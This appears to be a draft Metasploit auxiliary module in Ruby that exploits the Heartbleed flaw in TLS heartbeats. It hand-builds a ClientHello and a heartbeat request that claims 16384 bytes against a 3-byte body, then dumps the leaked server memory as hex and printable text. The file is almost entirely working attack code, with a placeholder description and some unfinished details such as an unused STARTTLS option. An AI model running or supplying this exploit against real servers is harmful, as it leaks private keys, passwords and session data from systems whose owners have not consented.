##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'HTTP SSL Heartbleed',
      'Author'      => 'Christian Mehlmauer <FireFart[at]gmail.com',
      'License'     => MSF_LICENSE,
      'Description' => %q{
          XXXXXX
      }
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('STARTTLS', [ false, "Use STARTTLS", false]),
      ], self.class)
  end

  def run_host(ip)
    send_heartbeat
  end

  def heartbeat
    payload = ""
    payload << "\x18"     # Content Type: Heartbeat (24)
    payload << "\x03\x02" # Version: TLS 1.1
    payload << "\x00\x03" # Length: 3
    payload << "\x01"     # Heartbeat Message Type: Request (1)
    payload << "\x40\x00" # Payload Length: 16384
    payload
  end

  def client_hello
    payload = ""
    payload << "\x16" # Type: Handshake (22)
    payload << "\x03\x02" # Version TLS 1.1
    payload << "\x00\xdc" # Length: 220
    payload << "\x01" # Handshake Type: Client Hello (1)
    payload << "\x00\x00\xd8" # Length: 216
    payload << "\x03\x02" # Version TLS 1.1
    payload << "\x53\x43\x5b\x90" # Random generation Time (Apr  8, 2014 04:14:40.000000000)
    payload << "\x9d\x9b\x72\x0b\xbc\x0c\xbc\x2b\x92\xa8\x48\x97\xcf\xbd\x39\x04\xcc\x16\x0a\x85\x03\x90\x9f\x77\x04\x33\xd4\xde" # Random bytes
    payload << "\x00" # Session ID length
    payload << "\x00\x66" # Cipher Suites length (102)
    payload << "\xc0\x14\xc0\x0a\xc0\x22\xc0\x21\x00\x39\x00\x38\x00\x88\x00\x87\xc0\x0f\xc0\x05\x00\x35\x00\x84\xc0\x12\xc0\x08\xc0\x1c\xc0\x1b\x00\x16\x00\x13\xc0\x0d\xc0\x03\x00\x0a\xc0\x13\xc0\x09\xc0\x1f\xc0\x1e\x00\x33\x00\x32\x00\x9a\x00\x99\x00\x45\x00\x44\xc0\x0e\xc0\x04\x00\x2f\x00\x96\x00\x41\xc0\x11\xc0\x07\xc0\x0c\xc0\x02\x00\x05\x00\x04\x00\x15\x00\x12\x00\x09\x00\x14\x00\x11\x00\x08\x00\x06\x00\x03\x00\xff" # Cipher Suites
    payload << "\x01" # Compression methods length (1)
    payload << "\x00" # Compression methods: null
    payload << "\x00\x49" # Extensions length (73)
    payload << "\x00\x0b\x00\x04\x03\x00\x01\x02" # Extension: ex_points_format
    payload << "\x00\x0a\x00\x34\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11" # Extension: elliptic curves
    payload << "\x00\x23\x00\x00" # Extension Sessionticket TLS
    payload << "\x00\x0f\x00\x01\x01" # Extension Heartbeat
    payload
  end

  def send_heartbeat()
    connect
    # send ssl client hello
    sock.put client_hello
    # receive server_hello (can be ignored)
    server_hello = sock.get
    # send heartbeat request
    sock.put heartbeat
    hdr = sock.get_once(5)
    unpacked = hdr.unpack('CH4C')
    type = unpacked[0]
    ver = unpacked[1] # must match the type from client_hello
    len = unpacked[2]
    print_status "Type: #{type}"
    print_status "Version: #{ver}"
    print_status "Length: #{len}"
    if type == 24
      print_status("Received Heartbeat response! Trying to get the data")
      #pay = sock.get_once(len)
      pay = sock.get
      print_status "Payload: #{pay.unpack("H*")[0]}"
      print_status "Payload printable only: #{pay.gsub(/[^[:print:]]/, '')}"
    end
  end

end
